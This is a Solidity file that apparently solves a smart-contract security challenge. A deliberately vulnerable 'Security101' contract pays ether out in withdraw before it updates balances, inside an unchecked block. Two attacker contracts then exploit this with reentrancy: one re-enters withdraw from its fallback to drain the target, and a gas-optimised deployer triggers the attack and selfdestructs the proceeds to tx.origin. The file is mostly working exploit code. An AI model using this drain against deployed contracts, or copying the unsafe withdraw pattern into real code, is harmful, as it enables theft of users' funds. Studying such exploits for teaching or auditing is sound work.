// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.15;
import "forge-std/console.sol";

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

// https://ethereum.stackexchange.com/questions/29469/is-addressthis-a-valid-address-in-a-contracts-constructor
// in order to `receive` callback, we have to add a new contract and attack outside constructor
contract AttackerMiddle {
    address constant token = 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f;
    constructor() payable {
        Security101(token).deposit{value: msg.value}();
    }

    fallback() external payable {
        uint value;
        if (address(this).balance == 0) {
            value = block.number;
        } else if (msg.value == 0) {
            value = address(token).balance;
        }else if (msg.value == address(this).balance) {
            value = msg.value;
        }
        if (value != 0) {
            Security101(token).withdraw(value);
        }
        // if (msg.sender.balance == 0) {
        //     selfdestruct(payable(tx.origin));
        // }
    }
}

// when selfdestruct, nothing would write to code, saving gas.
contract OptimizedAttackerSecurity101 {
    constructor(address token) payable {
        AttackerMiddle tmp = new AttackerMiddle{value: block.number}();
        Security101(address(tmp)).deposit();
        Security101(address(tmp)).deposit();
        selfdestruct(payable(tx.origin));
    }
}
